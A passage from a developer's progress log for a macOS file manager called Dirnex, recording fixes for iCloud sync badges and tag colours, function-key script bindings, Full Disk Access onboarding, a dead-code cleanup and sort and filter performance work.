- Cost: one read **measured at ~24 µs**, over twice a tag's `getxattr` → ~2.5 s across 100k rows,
  against M1's 150 ms budget. Also: the percent-downloaded keys are **unavailable** through
  `resourceValues` on macOS (`NSMetadataQuery` only), which is what rules out a progress-pie badge.

Core (+18 → **771**): `Services/CloudSyncStatus.swift` — `CloudSyncStatus` (`upToDate`,
`notDownloaded`, `downloading`, `uploading`, `conflicted`, `failed`, `excluded`; `isNoteworthy`
keeps `.upToDate` from drawing, `isTransfer` drives the follow-up poll below) + `CloudItemAttributes`
whose `status` is the whole truth table, precedence documented and test-pinned (errors > conflicts >
**excluded** — an excluded file never uploads, so `isUploaded` is `false` on it forever and asking
about uploads first would badge it as eternally pending — > downloading > notDownloaded > uploading)
+ `CloudDownloadingStatus`, a raw-string enum pinning the system's own spellings so the mapping is
testable without a cloud file. `Services/CloudSyncStorage.swift` — the read, beside `FinderTagStorage`
because it touches the filesystem, local-only like it (`.unsupported` for an archive/SFTP path rather
than a false "not a cloud item"). **Naming**: `SyncStatus` was already taken by the sync-directories
diff classification, hence `CloudSyncStatus` throughout.

App (+8 → **68**): `CloudSyncStatusProvider` (`FinderTagProvider`'s twin — off-main, per-directory,
LRU-cached, debounced, published by notification) + `SyncBadgeView`/`SyncBadgeStyle` (SF Symbols,
system colours; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
`PanelViewController+SyncStatus` + app-wide `AppPreferences.showSyncStatus` (default **on**) with a
`view.toggleSyncStatus` command, View-menu checkmark, ⌘K palette entry and Settings ▸ Panels toggle.
**THE design call that makes it free: the directory gate.** Tags have to look at every row to find
out, because a tag can be on any file anywhere; a cloud file cannot — it lives in a cloud folder, and
a cloud folder announces itself in **one** read (probed: `~/Library/Mobile Documents` and everything
under it report `isUbiquitous == true`). So an ordinary folder of 100k rows costs one read, not 100k.
The `~/Library/CloudStorage` clause beside it is documented as **unverified insurance** — no
third-party provider was installed to probe, and "where available" is the plan's own hedge.

**THE live-caught bug: the badge stuck on "downloading" forever.** Every other refresh here is driven
by a filesystem event, which is enough for a state the filesystem announces (evicted, materialized)
and *not* enough for a transfer: the last event of a download arrives while the file is still
arriving, so the scan it triggers sees `isDownloading`, paints the blue arrow — and nothing ever
fires again. Observed on a real 3 MB file. Fix: a snapshot with anything in flight asks itself again
a second later until nothing is (`scheduleFollowUp`), bounded both by "only while a transfer is
actually in progress on screen" and a 60-tick cap so a wedged provider can't become a busy-wait.
LIVE, after the fix: two evicted files badged, the synced one bare, `brctl download` → blue arrow →
badge **cleared on its own**; tag dot + cloud rendered in Finder's order; the View toggle collapsed
and restored them. GOTCHAS: the two additions tipped `PanelViewController.swift` to 502 lines (limit
500) and the new command tipped `CommandCatalog` past `type_body_length` — both fixed structurally
along each file's own existing seam (a new `PanelViewController+Render.swift`; the View group joined
the same-file extension that already holds Workspace/Window/Application) rather than by trimming
comments as pass 14 had to.

Found in passing, **not fixed** (it is the tags feature, not this one): **iCloud rewrites a tag's
stored colour.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
`Red\n1` — reproducible, twice, while the identical write to a local file keeps `6`. Finder still
draws the dot red (it looks the colour up by *name*, as the pass-3 core notes it does), and Dirnex
draws the stored colour → grey. So tag colours may be wrong on every tagged file in iCloud Drive.
Whether Finder's own tagging UI produces the same stored state is **untested** — the AppleScript
`label index` path writes only the legacy Finder-info byte, not `_kMDItemUserTags`, so it could not
answer the question. Worth a pass of its own: the provider already keeps the name → colour map
(`known`) that a fix would consult. → **Answered and fixed in pass 17 below: Finder's own UI does it
too, so it was every tagged file in iCloud Drive.**

Progress (2026-07-17, M6 pass 17 — the iCloud tag-colour bug from pass 16; **fixed, VERIFIED LIVE
side by side with Finder**): tag dots now take a colour from the tag's **name**, the way Finder does,
instead of from the byte the file stores.

**The probe answered pass 16's open question, and the answer was the bad one.** Tagging a file in
iCloud Drive **with Finder's own right-click ▸ Tags UI** stores `Red\n1`, not `Red\n6` — immediately,
not after a sync delay. So this was never about hand-written attributes: it is **every tagged file in
a user's iCloud Drive**. Three more things the probe established, each of which killed a cheaper fix:

- **The rewrite is colour-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
  lands as `Zebra\n1`. Every tag, whatever it is, ends up at colour **1**. Off iCloud the same writes
  keep their colour indefinitely (`Red\n6`, `Zebra\n3`).
- **There is no second opinion on the file.** The legacy `com.apple.FinderInfo` label byte is
  normalised to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
  already knows how to read cannot rescue the colour.
- **Finder's own name → colour database is not readable.** It is not in `com.apple.finder`'s plist
  (`FavoriteTagNames` is just the stock seven); the `TagsCloudSerialNumber` key there hints at a
  private synced store, and a custom `Zebra` appears nowhere under `~/Library`. This confirms the
  pass-3 decision to accumulate sightings rather than depend on Finder's list — there is nothing to
  depend on.

Core: new `FinderTagIndex` in `FinderTag.swift` (+10 → **781 core**) — the app's honest
approximation of Finder's database. It works **only because the stock seven are constants**:
`FinderTag.systemTags` seeds it, so Red is 6 before a file is read and is never in doubt after, and a
sighting is refused the right to overwrite a stock name. App: `FinderTagProvider` hands it the map it
was already keeping (`known` → `index`, `record` → `learn`, `forget`, `knownTags`/`knownTagNames`
delegate) and exposes `resolve`; `PanelViewController+Tags.tags(for:)` resolves **at the point of
drawing**, deliberately not folding it into the snapshot — `FinderTagSnapshot` keeps meaning *what
the files say*, which is exactly what its hand-rolled `==` compares to decide a repaint.

**A second instance of the same bug, found while fixing the first — and this one wrote to disk.**
`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and colour** the files
themselves carry over the learned one", so the ⌃T menu drew Red's swatch grey for an iCloud target.
Worse: that same `FinderTag` is the item's `representedObject`, i.e. the tag `toggleTag` **writes** —
so tagging an iCloud file and a local file Red together wrote `Red\n1` to the *local* file, where the
byte is not normalised and simply persists. The same leak arrives by plain copy: a tagged file copied
**out** of iCloud Drive lands locally carrying `Red\n1` forever. Resolving by name fixes the swatch,
the write, and the copied-out file's dot. Note the old comment was already at odds with the pass-3
core doc's own "a colour belongs to the NAME, system-wide, not to the file".

**THE judgement call: a grey sighting never displaces a colour already known** (`FinderTagIndex.learn`).
Grey is what iCloud normalises *to*, so it is the one reading indistinguishable from the provider
having eaten the real colour — and without the guard the fix would have **caused a regression**: a
custom `Zebra` seen purple on the Desktop and grey in iCloud Drive would land on whichever folder was
browsed last, flipping the Desktop's currently-correct dot to grey. Cost: genuinely recolouring a tag
*to* grey isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
reach this path — `learn` refuses them outright. Known edge, left alone: learning a colour does not
repaint a folder already scanned, so a custom tag's dot updates on that folder's next scan.

LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores colour 1
read blue / red / red correctly; a custom `Zebra` showed grey until the Desktop was scanned, then
turned **purple** on the iCloud file while the Desktop's stayed purple — the guard holding. ⌃T on an
iCloud target offered Red with a red swatch and a checkmark, Zebra in purple; toggling Red across a
mangled `Red\n1` file and a local one wrote **`Red\n6`** to disk; a file copied out of iCloud drew
red. All 781 core + 68 app tests green, `swiftlint --strict` clean.

Progress (2026-07-17, M6 pass 18 — **the user-script F-key binding, VERIFIED LIVE**): a script can be
bound to a function key and runs from both the bar button and the physical key. This was the smallest
of the three optional leftovers, and pass 14's prediction ("an organizer field + one `UserScript`
field") was right about the *shape* and wrong about the *hard part*, which turned out to be deciding
**which keys may be offered at all**.

**The probe came first (the pass-1 `git` / pass-16 iCloud method), and it decided the design.** Two
independent sources reserve an F-key, and neither is guessable:
- **A menu key-equivalent is dispatched by AppKit before `keyDown` reaches the pane** — the same fact
  pass 14 leaned on for "zero double-fire". Read the other way it is a trap: a script bound to F5
  would run from its **button** and be **dead on the key**, the one asymmetry this feature must not
  ship. So the reserved set is *derived* from `KeyBindings` + `CommandCatalog`, never hard-coded, and
  it reads the **user's live bindings** because they move (the Total Commander preset rebinds
  `view.quickLook` onto bare F3 and `file.rename` off bare F2). A *modified* shortcut (`⇧F2`, `⌥F5`)
  does **not** reserve the bare key — it is a different equivalent.
- **macOS eats bare F11 itself.** Probing `com.apple.symbolichotkeys` found id 36 (Show Desktop) bound
  to keycode 103 with a bare `fn` mask — the WindowServer consumes it before the frontmost app is
  asked. Every *other* F-key system hotkey needs a real modifier (`⌃F1`–`⌃F8` keyboard navigation
  = mask 8650752 = fn+⌃; `⌥⌘F5` accessibility), so they leave the bare keys alone. Mission Control is
  `⌃↑` here, not F3 — which is why F3 works today. F11 is excluded as a **documented default**, not a
  live read: a user who turned Show Desktop off loses one key, against a silent no-op for everyone
  who didn't. Net offer: **F1, F4, F9, F10, F12**.

Core (+14 → **801**): `UserScript.functionKey: Int?` (optional, so a pre-existing store decodes via
the synthesized `decodeIfPresent`; its `paletteCommand` now advertises the key as a real
`CommandShortcut`) · `UserScripts` upholds one-script-per-key the way it already does one-per-name —
**`save` steals the key** from a previous holder rather than refusing (refusing strands the user
re-editing a script they can't see from where they are; the dispossessed script keeps everything else
and stays palette-runnable), and the de-duplicating `init` repairs a hand-edited store, first holder
winning · `FunctionBar.reservedFunctionKeys(bindings:)` / `assignableFunctionKeys(bindings:)` /
`slots(userScripts:bindings:)` merging script slots over the built-ins in key order.
`slot(forFunctionKey:in:)` **lost its default argument on purpose**: a caller that forgot the merged
bar would silently never fire a script's key, a bug indistinguishable from "the feature is broken".

**THE call that shapes the store: a script keeps a key that is currently unassignable.** The reserved
set is user state that moves, so validating at *save* and stripping the key would destroy the binding
on a preset switch, permanently. The bar filters at the point of building itself instead, so the
button vanishes and returns with the preset. The organizer shows such a key as **"F4 (unavailable)"**
rather than lying with "None".

App (+6 → **76**): `FunctionBarView.setSlots` (the bar was build-once-in-`init`, which cannot express
a binding that changes at runtime; `removeArrangedSubview` alone leaves the old button *drawn*, so it
is paired with `removeFromSuperview`) · the window controller re-derives the bar on
`UserScriptStore.didChangeNotification` **and** `KeyBindingStore.didChange` (a rebind can reserve a key
a script was using) · the pane's key handler routes a `userScript.*` id to `runScript` directly — it
needs none of `runCommand(id:)`'s focus restoration, because the press *came from* the focused pane,
and both paths converge on `runScript` · organizer popup + the `type_body_length` gotcha this file
hits every time (fixed structurally again: helpers into the same-file `private extension`).

**THE live-caught bug: the palette printed no key.** `KeyBindings.shortcut(for:)` resolves an
un-overridden id **through `CommandCatalog`** — so it answers `nil` for anything not in the registry,
and a user script's F9 went unadvertised. Fix is deliberately narrow (`CommandPaletteController
.shortcut(for:)`): a *non-catalog* command's own shortcut is authoritative; a *catalog* command still
goes through the bindings, because `nil` there can mean the user **deliberately unbound** it and
falling back to `Command.shortcut` would resurrect the default they just removed. +3 app tests pin
both halves — the palette had no tests before, and the type system could not have caught this.

LIVE: the organizer's new popup offered exactly **None · F1 · F4 · F9 · F10 · F12** (the derived set,
on screen); binding F9 made **F9 Proof** appear in the bar *while the sheet was still open* (the
notification rebuild), cells re-flowing in key order; the **physical F9 key** ran the script —
`count=2`, cwd = the active pane, `DIRNEX_OTHER_DIR` = the other pane, and `jmeter copy.log` arrived
as **one argv element despite its space**, the pass-12 security contract holding; the **button** ran
it against a different 3-file selection (a fresh run, and the click kept the pane's marks — pass 14's
focus fix); the palette printed "Proof **F9**" after the fix; a second script taking F9 **stole** it,
the bar flipping to "F9 Second" with no duplicate and Proof's popup reading "None"; the binding
survived relaunch, and removing the scripts returned the bar to its six built-ins. All 801 core + 76
app tests green, `swiftlint --strict` and `swiftformat --lint` clean.

Noted in passing, **pre-existing and not touched**: the app logs `NSEventModifierFlagFunction … is
only supported for system-provided menu items; will not be used` for each F-key menu item. Harmless —
the dropped `fn` flag leaves those items on the *bare* F-key, which is what the bar already relies on
and what `reservedFunctionKeys` assumes.

**NEXT: M6 is closed.** Optional leftovers, none blocking: an **App Intents / Shortcuts** surface on
the `Automation` core, a user script's F-key binding (the bar + key handler already accept any
command id — an organizer field + one `UserScript` field), and the .gitignore-aware folder sizes from
pass 1. **M7 (release readiness) is next.** → *The F-key binding is done in pass 18 above; the
**App Intents surface is done 2026-07-19**, see the "App Intents / Shortcuts" note at the end of this
file; only the .gitignore-aware folder sizes remain.*

### M7 — Release readiness (M)

- [x] Sparkle 2 updates + appcast infrastructure; notarized DMG pipeline in CI
      (shipped 2026-07-19, VERIFIED LIVE — v0.0.3 published a signed/notarized/stapled DMG + Sparkle
      appcast from GitHub Actions; the app has a "Check for Updates…" command wired through the
      registry, plus a titlebar update indicator that keeps a postponed update visible — see the
      2026-07-19 "titlebar update indicator" note below)
- [x] Beta + stable update channels (Sparkle `<sparkle:channel>`, in-app opt-in)
      (shipped 2026-07-19 — tested core `UpdateChannels`, an app-side beta opt-in wired through
      `AppUpdater`'s `SPUUpdaterDelegate.allowedChannels(for:)`, and a two-channel merging appcast
      pipeline; the merge is proven across all channel-transition scenarios and the opt-in is
      live-verified in the shipping binary. See the 2026-07-19 "channels — DONE" note below)
- [x] Full Disk Access onboarding flow (detect, explain, deep-link to System Settings)
- [x] First-run tour: palette-centric, 5 screens max
- [x] Performance pass: instruments audit of M1 budgets on real dirty data
      (huge Downloads, node_modules, network volumes, iCloud placeholder files)
- [x] Licensing: Apache 2.0 for the code, with the name "Dirnex" and the app icon
      carved out of the grant (shipped 2026-07-19 — `LICENSE` verbatim Apache 2.0,
      `NOTICE` carrying the carve-out into every redistribution, `TRADEMARKS.md`
      with the fork checklist; see the 2026-07-19 "licensing" note below)

Exit: a stranger can download, pass FDA onboarding, and move files in under 3 minutes.

---


Progress (2026-07-17, M6 pass 18 — the red sync badge on every tag write; **fixed, VERIFIED LIVE
against real iCloud**): a user reported the sync badge flashing the **red `xmark.icloud`** for the
couple of seconds after applying a Finder tag, then settling — while the tag itself synced to their
phone fine. It was real, it was ours, and it was not about tags at all.

**Probed before writing a line of Swift** (a fresh `URL` per read, polling every 50 ms). iCloud
attaches `NSCocoaErrorDomain` **4355** `NSUbiquitousFileUbiquityServerNotAvailable` — *"Couldn't
access your iCloud account. The iCloud servers might be unreachable"* — to **every ordinary pending
upload**, on a healthy account, with the upload completing seconds later. Three samples, all healthy:

- a tag write: error appears with `isUploading=true, isUploaded=false` at the instant the tag lands,
  gone 1.5 s later;
- a **one-line content edit** — so this was never tag-specific, tagging is just the cheapest way for a
  file manager to start an upload;
- a **60 MB file**, where the error was already in the *first* sample, **before `isUploading` had even
  flipped true**.

So `CloudItemAttributes.status`'s first question — `if hasDownloadingError || hasUploadingError` —
was true for the whole of every upload, and errors are the top of the precedence. The red cross was
painted over every upload the user ever made, and `.uploading`'s blue arrow was **effectively dead
code**: unreachable on the one provider we can test against.

**THE fix: the presence of an error is not information; its identity is.** New core
`CloudTransferError` (`.serverUnavailable` / `.quotaExceeded` / `.itemUnavailable` / `.other`,
mapped from `(domain, code)` so 4355 in someone else's domain stays `.other`), and
`CloudItemAttributes` now carries `downloadingError`/`uploadingError` as classified values rather
than two Bools. Only an error that `isVerdict` yields `.failed`; `.serverUnavailable` falls through
to the transfer states — which is not a suppression but **the more honest reading**: a file whose
server is unreachable *is* waiting to upload, and that stays true whether the provider is quietly
retrying or the Mac is on a plane. It is `.failed` that was the lie. Same core-decides-meaning /
app-does-I/O split as `CloudDownloadingStatus`, and the codes are pinned by a test for the same
reason the status strings are.

The suppression is **per-error, not per-file**: a real `.itemUnavailable` alongside a routine
`.serverUnavailable` still fails, and a conflict mid-upload still reads `.conflicted` (both pinned).
`.quotaExceeded` — the one that genuinely demands a human — is untouched.

LIVE (the shipping reader + truth table driven against a real iCloud file, the user's exact gesture):
`upToDate` → **`uploading`** (`uling=true uploaded=false uploadErr=serverUnavailable`) → `upToDate`.
That middle line is precisely the window that used to read `failed`. 785 core + 70 app tests green,
swiftlint 0 violations, swiftformat clean.

**Worth remembering beyond this bug:** the pass-16 probe established what the attributes *say*; it did
not establish what they say during a **healthy** transfer, because the probes were an eviction and a
download — never a routine upload from a resting file. A truth table built only from interesting
samples encodes the boring case wrong, and the boring case is every row the user has.


Progress (2026-07-17, **M7 pass 1 — Full Disk Access onboarding; the box closes `[x]`, VERIFIED
LIVE**, and M7 is now open): the exit-criteria centerpiece — *"a stranger can download, pass FDA
onboarding, and move files in under 3 minutes."* A file manager without the grant browses Home fine
but hits a permission wall at other users' folders, `~/Library/Mail`, Time Machine backups; this
catches the wall at first launch and walks the user to the one switch.

**Probed before writing Swift** (the M4/M5/M6 opener): on **macOS 26.5.2** a TCC-denied read is
`EPERM` (errno 1), which Foundation surfaces as `NSFileReadNoPermissionError` (Cocoa 257). **The
sentinel choice is the load-bearing decision:** `~/Library/Application Support/com.apple.TCC/TCC.db`
is the gold standard — TCC creates it on **every** account so it is always present, and it is
readable **only** with FDA, so a successful read is positive proof of the grant and a permission
error positive proof of its absence. The Mail/Safari/Messages folders can't play that role: a user
who never ran Mail simply has no `~/Library/Mail`, and that **absence must never read as denial** —
they are fallbacks only.

Core `DirnexCore/Services/FullDiskAccess.swift` (the same **core-decides-meaning / app-does-I/O**
split `CloudSyncStatus` draws): `FullDiskAccessStatus` (`.granted`/`.denied`/**`.unknown`** — the
honest answer when every sentinel is missing or fails for a non-permission reason, never a *guessed*
denial), `SentinelReadOutcome`, the ordered `sentinelPaths`, a **pinned** `systemSettingsURLString`,
`status(reading:)` (folds per-sentinel reads through an injected closure — **short-circuits at the
first `.readable`** so the app never touches `~/Library/Mail` once TCC.db answered; a denial anywhere
outranks the inconclusive), and `outcome(domain:code:)` (the `CloudTransferError.init(domain:code:)`
move — Cocoa 257/513 + POSIX `EPERM`/`EACCES` → `.permissionDenied`; Cocoa 260/4 + `ENOENT` →
`.missing`; else `.otherFailure`). +10 → **812 core**.

App: `Dirnex/Onboarding/FullDiskAccessChecker.swift` (off-main real reads — `stat` for existence,
which TCC always allows, then a one-byte file open or a directory listing, catch → core classifier;
`status(inHomeDirectory:)` is the injectable seam a test fills with a temp home) + `FullDiskAccess`​
`Onboarding.swift` (an `NSAlert` sheet — single-decision surface matching the app's alert-driven
modals; `enableEscapeToCancel`; **"Open System Settings"** opens the pane via `NSWorkspace.open`; a
distinct **"already granted"** variant for the on-demand path so the command is never a silent
no-op) + AppDelegate launch hook (`presentIfNeeded`) and `showFullDiskAccess(_:)` selector +
`app.fullDiskAccess` catalog command + `CommandBinding` entry + an **App-menu item after Settings** +
an `AppPreferences.hasSeenFullDiskAccessOnboarding` **one-shot latch** (fresh install prompts once,
never nagged after; the menu item re-opens it anytime). +3 → **79 app** (`FullDiskAccessChecker`
against a throwaway temp home: readable→`.granted`, empty→`.unknown`, and a `chmod 000`
denied→`.denied` **guarded by `getuid() != 0`** since root ignores permission bits).

**THE macOS-26 deep-link finding (live-probed, not recalled):** *both*
`com.apple.preference.security?Privacy_AllFilesAccess` **and**
`com.apple.settings.PrivacySecurity.extension?Privacy_AllFilesAccess` land on the Privacy & Security
**overview**, not the FDA sub-list — Tahoe stopped honouring the anchor into the specific pane. FDA is
one *labelled* click away, so I kept the canonical constant and wrote the copy to match ("switch on
Dirnex **under** Full Disk Access"). **THE test-host gotcha:** the app test host launches the real
delegate, so `presentIfNeeded` fired **during `xcodebuild test`** and flipped the shared-defaults
latch (that is why the latch read `1` before I ever launched by hand); guarded with
`ProcessInfo…environment["XCTestConfigurationFilePath"]` — **empirically confirmed** by resetting the
latch to `0`, running the full suite, and watching it stay `0`.

LIVE (fresh ad-hoc build, which loses its FDA grant on every rebuild → `.denied`): first launch
popped the prompt attached to the browser window; **Open System Settings** fronted System Settings on
Privacy & Security with **Full Disk Access** visible; the **App-menu ▸ Full Disk Access…** item
re-opened the same prompt on demand; **Not Now** dismissed cleanly back to normal browsing (graceful
degradation). 812 core + 79 app green, swiftlint `--strict` 0 violations, swiftformat clean.
(Escape-to-dismiss couldn't be confirmed through a *synthetic* key event — the same OS-swallows-
synthetic-keys quirk the pass-13 ⌘K note records — but it uses the identical `enableEscapeToCancel`
helper every other Dirnex sheet does.)

**Follow-up fix (2026-07-17, live-probed):** the "Tahoe stopped honouring the anchor" conclusion
above was wrong — the anchor *name* was. Asking System Settings itself
(`name of anchors of pane "Privacy & Security"` via AppleScript) shows the pane has **no**
`Privacy_AllFilesAccess` anchor; the real one is **`Privacy_AllFiles`**, and an unknown anchor
silently falls back to the pane top. With the correct anchor **both** pane ids land squarely on the
Full Disk Access sub-pane (window title "Full Disk Access", confirmed through System Settings'
own scripting since `osascript` lacks assistive access). `systemSettingsURLString` now pins
`com.apple.preference.security?Privacy_AllFiles` — the legacy id, because it is the one that also
works back through the Ventura System Settings rewrite. The dialog copy still reads right ("switch
on Dirnex under Full Disk Access") — the user now just starts *in* that list.

Progress (2026-07-17, interlude — **dead-code sweep, VERIFIED LIVE**): a full-codebase
symbol-reference audit (grep-scripted, each hit hand-verified, cross-checked with `periphery` 3.7.4)
removed every production-dead symbol: `SMBMounter.disconnect(mountPoint:)`/`isOwnedMount` (the
sidebar ejects through `NSWorkspace` directly; `mount` now returns a bare `URL` — `MountResult`
and its never-read `createdByUs` are gone), `DirectorySizeProvider.cachedSize(for:)` (the pass-9
batch `cachedSizes` superseded it), `AutomationVerb` (nothing in the app ever read it; the sdef
drift-pin it promised lives on in `ScriptingCommandsTests`, now against the literal three names),
`Frecency.bestMatch`, `Panel.moveCursorToStart/End` (the app's `FileTableView` does Home/End
itself), `UndoJournal.removeTop`, `GitStatusEntry.isStaged`/`hasWorktreeChanges` (+ their now-orphaned
`isUntrackedOrIgnored`), `GitBranch.hasUpstreamDivergence`, `FileEntry.isSymlink`/`isBrokenSymlink`,
`SizeVisualization.isComplete`, `SyncComparison.isIdentical`, and the M0 umbrella `Dirnex.version`
(file + smoke test). Test-only conveniences were rewritten against the underlying API, not kept
alive by their own tests; `FileOperationQueue.waitUntilIdle` stays as deliberate test support.
**One finding was a missing call, not dead code:** `cancelAllScans`'s doc claimed "the one caller is
the last pane leaving the mode" but no caller existed — the whole `DirectoryLoader.cancellableSize`
cancellation machinery was unreachable. Now wired: `clearSizeVisualization` calls it when this pane
genuinely drops its projection **and** no tab in either pane still has the mode on. Placement
matters — the first attempt sat before the `sizeVisualization != nil` guard and fired (as a no-op)
on *every* steady-state render pass, which the live log exposed as a ~150 ms-cadence flood; behind
the guard it fired exactly once for the whole session, on toggle-off, catching a genuinely
in-flight walk (`drain=true inFlight=1` — driven via the pass-15 AppleScript verb
`run operation "view.sizeVisualization"` against a Terminal-launched build, the pass-14 stderr
trick). 808 core (−4) + 79 app tests, lint/format clean. `periphery scan --project Dirnex.xcodeproj
--schemes Dirnex` also surfaced a second batch — unused *overloads* the name-based scan can't split
(`SavedSearch`/`ServerConnection`/`UserScripts`/`Workspaces` `remove`/`move`/`rename` variants,
`ArchiveTOC.init(childrenByDirectory:directoryPaths:)`, `DirectorySizeCache.count/isEmpty/removeAll`,
`KeyBindings.resetAll`, `OpenWithApplications.all`, `MultiRename.identity`) and assign-only stored
properties (`FileEntry.creationDate/permissions/inode`, `GitStatusEntry.originalPath`,
`Places.isReadOnly`, `SFTPTransport.host/line`) — **left untouched**: periphery didn't index the
test targets, several are test-pinned design surface (e.g. `SizeVisualization.maximumBytes`), and
`VFSBackend.id` is a protocol requirement — each needs its own keep-or-cut call.

Progress (2026-07-18, **M7 perf pass — part 1: the filter budget, PROBED + MEASURED + CI-GATED**;
the box stays `[ ]` because the list-responsiveness half still wants an off-main sort — see NEXT):
the "instruments audit of M1 budgets" done as *reproducible measurement first*, not guesswork. A
throwaway probe on a synthetic 100k listing put both key budgets **over** in release:
**filter keystroke 51 ms** (worst 109 ms) vs the 16 ms budget, and **100k list build (name sort)
370 ms** vs 150 ms.

**Filter — fixed, budget met (1.4 ms), CI-gated.** Two root causes: (1) every keystroke re-ran the
*whole* pipeline including the sort — because `DirectoryModel.materialize` filtered *then* sorted; and
(2) `name.lowercased().contains(needle)` allocated a fresh lowercased String per entry per keystroke.
Fix: **split the projection into two stages** — `sortedEntries` (showHidden + sort, the expensive
`localizedStandardCompare` pass) is cached, and `visibleEntries` is the text filter applied on top of
it. Text filtering is order-preserving, so a `filter` didSet now runs **only `refilter()`, never a
re-sort** (`sort`/`showHidden`/`listing`/`directorySizes` changes run the full `resort()`). Then the
filter predicate itself: a **pure-ASCII needle** (every real keystroke) matches the needle's bytes
against a lazily-built, **byte-level ASCII-folded** copy of the names held in **one contiguous buffer**
(`LoweredNames` = `bytes` + `bounds`, a single allocation, not 100k tiny `[UInt8]`s — which also
lightens the huge-dir memory ceiling). **THE load-bearing correctness argument: for an ASCII needle a
UTF-8 byte-substring match is provably identical to `lowercased().contains` — an ASCII byte can never
occur inside a multi-byte UTF-8 sequence, so folding only `A`–`Z` and byte-matching changes no
outcome.** A non-ASCII needle (rare) falls back to the exact grapheme-aware `lowercased().contains`, so
canonical-equivalence matching is preserved. Result (release, 100k): **steady keystroke 51 → 1.4 ms,
cold first keystroke (with the lazy fold build) ~6 ms, both under 16 ms.** +6 correctness tests
(byte-path-across-Unicode-name, ASCII-needle-rejects-Unicode-only-name, Unicode-needle fallback,
resort/hidden-toggle keep the filter) in a same-file `private extension` (the `type_body_length` dodge
from the user-scripts pass).

**Sort — the honest finding: exact Finder collation is a ~350 ms floor at 100k, and no in-thread trick
safely beats it.** Probed every alternative: a **custom byte-order natural key sorts in 20 ms but
disagrees with `localizedStandardCompare` on ~12 % of adversarial Unicode pairs** (accented letters
collate near their base letter under ICU; byte order dumps them after ASCII) — a real, visible
regression for international filenames, **rejected.** An ASCII-fast-path-with-localized-fallback still
mismatched ~3 % (ICU weights punctuation/spaces and hyphen-ignorability *not* in ASCII order —
reproducing ICU collation is a minefield), **rejected.** NSString decoration barely helped (349 ms —
the ICU comparison, not String↔NSString bridging, is the cost); a quick parallel merge-sort was
*slower* (418 ms) on the naïve cut. So the sort keeps `localizedStandardCompare` **exactly**, and the
150 ms *list* budget is an **interactive-responsiveness** target to be met by sorting **off the main
thread** at the app layer (the disk read already is), **not** by making the sort itself faster.

**CI gating (the "XCTest metrics gated in CI" line, done as Swift-Testing budget tests).** New
`PerformanceBudgetTests` measures best-of-N wall-clock on a seeded 100k dirty listing and **enforces
budgets only in release** (`#if !DEBUG` — a debug `swift test` prints its numbers but compiles the
`#expect`s out, since unoptimised Swift is 3–5× slower and would false-fail). A new CI step runs
`swift test -c release --filter PerformanceBudget`. Gates: **filter keystroke (steady) < 16 ms** and
**(cold) < 32 ms** — both pass with margin; **100k model build < 1500 ms** as a *regression ceiling*
(catches an accidental O(n²)/per-entry-bridging blow-up; not the 150 ms target, which is off-main).
**Follow-up (2026-07-19): the cold budget was 16 ms and flaked on CI at 16.03 ms** — the first
keystroke uniquely pays the one-time O(n) `buildLoweredNames` fold over 100k names, which lands *right
at* the 16 ms frame budget on the (slower, shared) macos-26 runner. Reframed the cold test as a
**regression ceiling with CI headroom** (32 ms, mirroring the list-build ceiling) rather than the
interactive frame guarantee — the *steady-state* test owns the < 16 ms "feels instant" promise (and has
huge margin). 32 ms is 2× the CI number yet still trips a real regression: a reintroduced re-sort
(~350 ms) or swapping the byte-fold back to `String.lowercased()` (~4× per `buildLoweredNames`).
817 core (+9) + 79 app, swiftlint `--strict` 0, swiftformat clean. Reusable gotchas: **precomputed
`[String].contains` is still 35 ms/100k** (Swift's grapheme-aware `contains` is the cost — only the
byte path hits 1 ms); **subtracting two noisy ~380 ms build timings to isolate an ~8 ms keystroke is
numerically unstable** (it swung to 24 ms) — build the cache-cold model *outside* the timed region and
time only the `filter =` set instead.

**NEXT in M7:** **finish the perf pass** by moving the sort off the main thread — build the
`DirectoryModel` inside `DirectoryLoader.list`'s detached task (and the FSEvents refresh / column
re-sort paths) so opening a 100k dir never janks the `@MainActor` `PanelViewController`; needs a live
app build (Xcode + Metal toolchain) and live verification, so it is its own pass. Then the first-run
tour and the docs keyboard-reference (both buildable + live-verifiable, core-first). The remaining
items are **blocked on the user**: Sparkle 2 + notarized-DMG CI needs their Developer ID signing
identity + notarization creds + Sparkle EdDSA keys.

Progress (2026-07-18, **M7 perf pass — part 2: the off-main sort; the "Performance pass" box now
closes `[x]`, VERIFIED LIVE on a 100k directory**): part 1 met the filter budget and proved the exact
`localizedStandardCompare` sort is a ~350 ms floor at 100k that no in-thread trick beats without
diverging from Finder — so the 150 ms *list* target has to be met by sorting **off the main thread**.
This pass does that for every path that builds a pane's `DirectoryModel`. Core→app as always.
- **Core** (pure, tested): `DirectoryModel` gained an **off-main constructor** `init(listing:sort:
  showHidden:filter:directorySizes:)` (the existing 4-arg init now delegates to it with `[:]`) — it
  prunes the seeded `directorySizes` to present entries (as `updateListing` does) and sorts once, so a
  fully-materialised, `Sendable` model can be built on a background thread and handed over whole.
  `Panel` gained `setModel(_:)` — the off-main twin of `setListing`: it installs an already-sorted
  model and does **only** the cheap cursor/selection reconciliation (same refresh-vs-navigation
  decision by path, now factored into a shared `reconcile`), never a re-sort. **Second, a
  behaviour-preserving optimisation with its own payoff:** `setDirectorySize`/`setDirectorySizes` now
  re-sort **only when `sort.key == .size`** (`resortIfOrderDependsOnSize`) — under a name/date/ext sort
  the totals feed the size column and selection math but never the row order, so re-running the 350 ms
  sort was pure waste. That waste was real: size-visualization streams totals in ~ten a second, each of
  which used to re-sort the whole 100k listing on the main actor. The size-order tests (all `.size`
  sort) still pass; new tests pin that a name-sorted `setDirectorySize` updates the total without
  reordering, and that the sizes-init prunes + size-sorts. +6 core → **823 core**.
- **App**: `DirectoryLoader` gained `model(_:at:sort:showHidden:directorySizes:)` (readdir **and** sort
  in one detached task) and `sorted(_:sort:showHidden:directorySizes:)` (re-project an already-loaded
  listing off-main — the header re-sort). **THE decomposition decision: the loader sorts; the caller
  filters.** The text filter is *not* baked into the off-main model — it is the cheap ~1 ms stage and
  must reflect the caller's latest keystroke, so a new `installSortedModel` helper re-applies the live
